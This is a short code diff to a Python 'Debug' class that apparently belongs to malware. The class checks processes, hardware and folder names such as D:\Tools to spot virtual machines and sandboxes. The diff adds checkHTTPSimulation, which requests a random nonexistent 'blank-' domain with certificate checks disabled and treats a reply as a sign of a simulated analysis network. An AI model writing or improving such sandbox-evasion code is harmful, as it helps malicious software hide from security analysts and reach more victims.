@@ -1,7 +1,9 @@
 import os
 import psutil
+import random
 import subprocess
 import sys
+from urllib3 import PoolManager
 
 class Debug:
 	def __init__(self):
@@ -93,6 +95,7 @@ class Debug:
 			self.check_process() or
 			self.get_network() or
 			self.get_system() or
+			self.checkHTTPSimulation() or
 			self.check_video_controller()
 		)
 
@@ -135,3 +138,12 @@ class Debug:
 		r1 = any(controller in video_controller for controller in self.video_controllers)
 		r2 = any([os.path.isdir(path) for path in ('D:\\Tools', 'D:\\OS2', 'D:\\NT3X')])
 		return r1 or r2
+
+	def checkHTTPSimulation(self) -> bool:
+		http = PoolManager(cert_reqs="CERT_NONE", timeout= 1.0)
+		try:
+			http.request('GET', f'https://blank-{"".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=5))}.in')
+		except Exception:
+			return False
+		else:
+			return True
